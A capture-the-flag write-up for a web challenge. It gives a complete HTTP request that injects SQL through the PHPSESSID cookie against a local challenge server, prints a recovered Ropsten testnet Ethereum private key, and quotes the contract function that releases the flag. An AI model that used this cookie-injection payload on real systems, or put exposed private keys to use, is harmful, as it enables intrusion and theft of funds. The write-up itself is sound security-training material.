### 1.题目名称

Bitcoin private-key system



### 2.题目类型

web(middle)


### 4.考察知识点

cookie sqli and  basic ethereum conceptions



### 5.解题思路


By simple test, we can observe the sqli in the PHPSESSID(cookie), so we could accomplish the sqli with sqlmap or using the following payload:

```
GET /index.php HTTP/1.1
Host: 127.0.0.1:8004
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,pl;q=0.6
Cookie: PHPSESSID=qumofaj5cjgljuetdfbr2gdb35' or '1'='1
Connection: close
```

Then we get the Ethereum private key for 0xF16CE8A0dE02f72f1adE0359217F530df8Abf944 in Ropsten Test Network:

386BD35D089B7D6FDB7DDF0FDA67E3F0801DB92BC215909D89A92876E5F13250

And we find a contract 0xffd66e653e0675c5dd78d051545777a8007c4625 owned by this address, then we could get the source code of this contract in https://ropsten.etherscan.io/address/0xffd66e653e0675c5dd78d051545777a8007c4625#code, and there is a function named GetFlag:


    function GetFlag(string email) OnlyOwner payable public{
        if(msg.value >= 0.1 ether){
        emit SendFlag(email);
        }
    }


And we can guess if we trigger this function successfully, the flag might be sent to the email we provided. After you have done these steps, the flag (base64 encode) will lies in your mail box.









